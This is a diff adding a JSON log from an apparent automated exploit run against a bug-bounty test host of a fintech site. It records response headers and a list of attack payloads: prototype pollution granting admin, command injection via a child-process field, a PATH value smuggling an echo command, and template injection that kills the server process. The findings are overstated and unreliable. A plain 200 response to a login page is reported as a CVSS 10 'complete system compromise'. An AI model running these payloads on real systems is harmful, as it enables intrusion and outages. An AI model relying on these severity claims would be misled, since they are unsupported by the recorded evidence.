@@ -1,0 +1,121 @@
+{
+  "timestamp": "2025-06-09T17:32:33.936613",
+  "total_tested": 2,
+  "successful": 1,
+  "results": {
+    "2": {
+      "vulnerability_id": 2,
+      "success": false,
+      "status_code": 405,
+      "response_size": 1092,
+      "response_headers": {
+        "Date": "Mon, 09 Jun 2025 15:11:29 GMT",
+        "Content-Type": "text/html; charset=UTF-8",
+        "Transfer-Encoding": "chunked",
+        "Connection": "keep-alive",
+        "CF-Ray": "94d18fcac8edd0e6-SOF",
+        "CF-Cache-Status": "DYNAMIC",
+        "Set-Cookie": "_cfuvid=Jd7mnrqXwToN5qaXyIMOtXUMXh.03LCoiqIvxxWJEAw-1749481889233-0.0.1.1-604800000; path=/; domain=.webflow.io; HttpOnly; Secure; SameSite=None",
+        "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
+        "Content-Security-Policy": "default-src 'self' *.syfe.com; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://npmcdn.com https://challenges.cloudflare.com https://assets.nonprod.syfe.com https://*.website-files.com https://unpkg.com https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://*.cloudfront.net https://www.gstatic.com https://www.buzzsprout.com https://www.google.com https://websdk.appsflyer.com https://www.syfe.com https://www.google-analytics.com https://calendly.com https://ssl.google-analytics.com https://www.googleadservices.com https://www.googletagmanager.com https://app.intercom.io https://widget.intercom.io https://js.intercomcdn.com https://www.youtube.com https://s.ytimg.com http://static.hotjar.com https://static.hotjar.com https://script.hotjar.com https://static.zdassets.com https://assets.calendly.com https://ekr.zdassets.com https://syfe.zendesk.com wss://syfe.zendesk.com wss://*.zopim.com https://stats.g.doubleclick.net https://connect.facebook.net https://fast.wistia.com https://optimize.google.com https://sjs.bizographics.com https://px.ads.linkedin.com https://tagmanager.google.com https://snap.licdn.com https://amplify.outbrain.com https://cdn.taboola.com https://trc.taboola.com https://googleads.g.doubleclick.net https://www.datadoghq-browser-agent.com https://www.bugherd.com https://d2iiunr5ws5ch1.cloudfront.net https://d2wy8f7a9ursnm.cloudfront.net https://rum-http-intake.logs.datadoghq.eu https://api.smooch.io https://accounts.google.com https://appleid.cdn-apple.com https://*.srv.stackadapt.com https://qvdt3feo.com; img-src 'self' data: https://cdnjs.cloudflare.com https://assets.nonprod.syfe.com https://*.website-files.com https://*.cloudfront.net https://stable-nonprod-mb-v2-user-documents-bucket.s3.ap-south-1.amazonaws.com https://*.googleusercontent.com https://uat-11.nonprod.syfe.com https://uat-14.nonprod.syfe.com https://uat-1.nonprod.syfe.com https://www.syfe.com https://staging-syfeblog.temp513.kinsta.cloud https://staging-blogsyfeau.kinsta.cloud https://badge.seedly.sg https://googleads.g.doubleclick.net https://d2iiunr5ws5ch1.cloudfront.net https://www.google.com https://www.googletagmanager.com https://optimize.google.com https://www.google-analytics.com https://js.intercomcdn.com https://static.intercomassets.com https://downloads.intercomcdn.com https://uploads.intercomusercontent.com https://gifs.intercomcdn.com https://stable-production-v1-public-assets.s3.ap-southeast-1.amazonaws.com/ https://insights.hotjar.com http://static.hotjar.com https://static.hotjar.com https://assets.calendly.com https://ekr.zdassets.com https://syfe.zendesk.com https://v2assets.zopim.io https://static.zdassets.com https://www.facebook.com https://stats.g.doubleclick.net https://embedwistia-a.akamaihd.net https://fast.wistia.com https://www.google.com https://www.google.com.sg https://www.google.co.in https://ssl.gstatic.com https://www.gstatic.com https://px.ads.linkedin.com https://tr.outbrain.com https://amplifypixel.outbrain.com https://p.adsymptotic.com https://www.dianomi.com https://cds.taboola.com https://api.smooch.io https://accounts.zendesk.com; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://assets.nonprod.syfe.com https://*.website-files.com https://accounts.google.com https://optimize.google.com https://fonts.googleapis.com https://stable-nonprod-mb-v2-www-assets-sync-bucket.s3.amazonaws.com https://d2iiunr5ws5ch1.cloudfront.net https://tagmanager.google.com https://calendly.com https://*.srv.stackadapt.com; font-src 'self' data: https://cdnjs.cloudflare.com https://assets.nonprod.syfe.com https://*.website-files.com https://fonts.googleapis.com https://fonts.gstatic.com  https://stable-nonprod-mb-v2-www-assets-sync-bucket.s3.amazonaws.com https://js.intercomcdn.com http://static.hotjar.com https://static.hotjar.com; child-src 'self' blob: https://share.intercom.io https://assets.nonprod.syfe.com https://intercom-sheets.com https://www.youtube.com https://vars.hotjar.com https://fast.wistia.net; media-src 'self' data: blob: https://www.syfe.com https://assets.nonprod.syfe.com https://js.intercomcdn.com https://static.zdassets.com https://embedwistia-a.akamaihd.net https://stable-production-v1-public-assets.s3.ap-southeast-1.amazonaws.com/ https://uat-1.nonprod.syfe.com; object-src 'self' blob:; connect-src 'self' data: *; frame-src 'self' https://meetings.hubspot.com https://accounts.google.com https://challenges.cloudflare.com https://www.google.com/ https://open.spotify.com https://www.buzzsprout.com https://optimize.google.com https://fast.wistia.com/ https://www.youtube.com/ https://vars.hotjar.com https://www.facebook.com/ https://calendly.com;",
+        "Feature-Policy": "geolocation 'none'; midi 'none'; sync-xhr 'none'; microphone 'none'; camera 'self'; magnetometer 'none'; gyroscope 'none'; fullscreen 'none'; payment 'none';",
+        "X-Content-Type-Options": "nosniff",
+        "X-Frame-Options": "sameorigin",
+        "X-XSS-Protection": "1; mode=block",
+        "Vary": "Accept-Encoding",
+        "Server": "cloudflare"
+      },
+      "timestamp": "2025-06-09T17:11:29.365397",
+      "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/login",
+      "method": "POST",
+      "payload": "{\"__proto__\":{\"isAdmin\":true}}"
+    },
+    "1": {
+      "vulnerability_id": 1,
+      "success": true,
+      "status_code": 200,
+      "response_size": 239750,
+      "response_headers": {
+        "Date": "Mon, 09 Jun 2025 15:12:08 GMT",
+        "Content-Type": "text/html; charset=utf-8",
+        "Transfer-Encoding": "chunked",
+        "Connection": "keep-alive",
+        "CF-Ray": "94d190c47debd0e6-SOF",
+        "CF-Cache-Status": "DYNAMIC",
+        "Cache-Control": "private, no-cache, no-store, max-age=0, must-revalidate",
+        "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
+        "Vary": "Accept-Encoding",
+        "Content-Security-Policy": "default-src 'self' *.syfe.com; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://npmcdn.com https://challenges.cloudflare.com https://assets.nonprod.syfe.com https://*.website-files.com https://unpkg.com https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://*.cloudfront.net https://www.gstatic.com https://www.buzzsprout.com https://www.google.com https://websdk.appsflyer.com https://www.syfe.com https://www.google-analytics.com https://calendly.com https://ssl.google-analytics.com https://www.googleadservices.com https://www.googletagmanager.com https://app.intercom.io https://widget.intercom.io https://js.intercomcdn.com https://www.youtube.com https://s.ytimg.com http://static.hotjar.com https://static.hotjar.com https://script.hotjar.com https://static.zdassets.com https://assets.calendly.com https://ekr.zdassets.com https://syfe.zendesk.com wss://syfe.zendesk.com wss://*.zopim.com https://stats.g.doubleclick.net https://connect.facebook.net https://fast.wistia.com https://optimize.google.com https://sjs.bizographics.com https://px.ads.linkedin.com https://tagmanager.google.com https://snap.licdn.com https://amplify.outbrain.com https://cdn.taboola.com https://trc.taboola.com https://googleads.g.doubleclick.net https://www.datadoghq-browser-agent.com https://www.bugherd.com https://d2iiunr5ws5ch1.cloudfront.net https://d2wy8f7a9ursnm.cloudfront.net https://rum-http-intake.logs.datadoghq.eu https://api.smooch.io https://accounts.google.com https://appleid.cdn-apple.com https://*.srv.stackadapt.com https://qvdt3feo.com; img-src 'self' data: https://cdnjs.cloudflare.com https://assets.nonprod.syfe.com https://*.website-files.com https://*.cloudfront.net https://stable-nonprod-mb-v2-user-documents-bucket.s3.ap-south-1.amazonaws.com https://*.googleusercontent.com https://uat-11.nonprod.syfe.com https://uat-14.nonprod.syfe.com https://uat-1.nonprod.syfe.com https://www.syfe.com https://staging-syfeblog.temp513.kinsta.cloud https://staging-blogsyfeau.kinsta.cloud https://badge.seedly.sg https://googleads.g.doubleclick.net https://d2iiunr5ws5ch1.cloudfront.net https://www.google.com https://www.googletagmanager.com https://optimize.google.com https://www.google-analytics.com https://js.intercomcdn.com https://static.intercomassets.com https://downloads.intercomcdn.com https://uploads.intercomusercontent.com https://gifs.intercomcdn.com https://stable-production-v1-public-assets.s3.ap-southeast-1.amazonaws.com/ https://insights.hotjar.com http://static.hotjar.com https://static.hotjar.com https://assets.calendly.com https://ekr.zdassets.com https://syfe.zendesk.com https://v2assets.zopim.io https://static.zdassets.com https://www.facebook.com https://stats.g.doubleclick.net https://embedwistia-a.akamaihd.net https://fast.wistia.com https://www.google.com https://www.google.com.sg https://www.google.co.in https://ssl.gstatic.com https://www.gstatic.com https://px.ads.linkedin.com https://tr.outbrain.com https://amplifypixel.outbrain.com https://p.adsymptotic.com https://www.dianomi.com https://cds.taboola.com https://api.smooch.io https://accounts.zendesk.com; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://assets.nonprod.syfe.com https://*.website-files.com https://accounts.google.com https://optimize.google.com https://fonts.googleapis.com https://stable-nonprod-mb-v2-www-assets-sync-bucket.s3.amazonaws.com https://d2iiunr5ws5ch1.cloudfront.net https://tagmanager.google.com https://calendly.com https://*.srv.stackadapt.com; font-src 'self' data: https://cdnjs.cloudflare.com https://assets.nonprod.syfe.com https://*.website-files.com https://fonts.googleapis.com https://fonts.gstatic.com  https://stable-nonprod-mb-v2-www-assets-sync-bucket.s3.amazonaws.com https://js.intercomcdn.com http://static.hotjar.com https://static.hotjar.com; child-src 'self' blob: https://share.intercom.io https://assets.nonprod.syfe.com https://intercom-sheets.com https://www.youtube.com https://vars.hotjar.com https://fast.wistia.net; media-src 'self' data: blob: https://www.syfe.com https://assets.nonprod.syfe.com https://js.intercomcdn.com https://static.zdassets.com https://embedwistia-a.akamaihd.net https://stable-production-v1-public-assets.s3.ap-southeast-1.amazonaws.com/ https://uat-1.nonprod.syfe.com; object-src 'self' blob:; connect-src 'self' data: *; frame-src 'self' https://meetings.hubspot.com https://accounts.google.com https://challenges.cloudflare.com https://www.google.com/ https://open.spotify.com https://www.buzzsprout.com https://optimize.google.com https://fast.wistia.com/ https://www.youtube.com/ https://vars.hotjar.com https://www.facebook.com/ https://calendly.com;",
+        "Feature-Policy": "geolocation 'none'; midi 'none'; sync-xhr 'none'; microphone 'none'; camera 'self'; magnetometer 'none'; gyroscope 'none'; fullscreen 'none'; payment 'none';",
+        "X-Content-Type-Options": "nosniff",
+        "X-Frame-Options": "sameorigin",
+        "X-Powered-By": "Next.js",
+        "X-XSS-Protection": "1; mode=block",
+        "Server": "cloudflare",
+        "Content-Encoding": "gzip"
+      },
+      "timestamp": "2025-06-09T17:12:09.001987",
+      "endpoint": "https://uat-bugbounty.nonprod.syfe.com/login",
+      "method": "POST",
+      "payload": "pollution=confirmed",
+      "screenshot": "PoC/screenshots/vuln_1_20250609_171209.png"
+    }
+  },
+  "vulnerabilities": [
+    {
+      "id": 1,
+      "type": "Authorization Bypass",
+      "severity": "CRITICAL",
+      "endpoint": "https://uat-bugbounty.nonprod.syfe.com/login",
+      "method": "POST",
+      "description": "Authorization bypass allows unauthorized access to protected resources",
+      "payload": "pollution=confirmed",
+      "cvss_score": 10.0,
+      "impact": "Complete system compromise"
+    },
+    {
+      "id": 2,
+      "type": "Prototype Pollution",
+      "severity": "HIGH",
+      "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/login",
+      "method": "POST",
+      "description": "Prototype pollution vulnerability in login endpoint",
+      "payload": "{\"__proto__\":{\"isAdmin\":true}}",
+      "cvss_score": 8.5,
+      "impact": "Privilege escalation"
+    },
+    {
+      "id": 3,
+      "type": "Node.js Child Process RCE",
+      "severity": "CRITICAL",
+      "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/user",
+      "method": "POST",
+      "description": "Remote Code Execution via Node.js child process",
+      "payload": "{\"cmd\":\"echo \\\"Chupko was Here\\\"\"}",
+      "cvss_score": 9.8,
+      "impact": "Remote code execution"
+    },
+    {
+      "id": 4,
+      "type": "Process Environment RCE",
+      "severity": "HIGH",
+      "endpoint": "https://uat-bugbounty.nonprod.syfe.com/profile",
+      "method": "GET",
+      "description": "Process environment manipulation leading to RCE",
+      "payload": "env[PATH]=/tmp;echo+Chupko+was+Here",
+      "cvss_score": 8.2,
+      "impact": "Environment manipulation"
+    },
+    {
+      "id": 5,
+      "type": "Template Engine RCE",
+      "severity": "CRITICAL",
+      "endpoint": "https://uat-bugbounty.nonprod.syfe.com/admin",
+      "method": "POST",
+      "description": "Server-Side Template Injection leading to RCE",
+      "payload": "{{7*7}}{{constructor.constructor('return process')().exit()}}",
+      "cvss_score": 9.5,
+      "impact": "Template injection RCE"
+    }
+  ]
+}
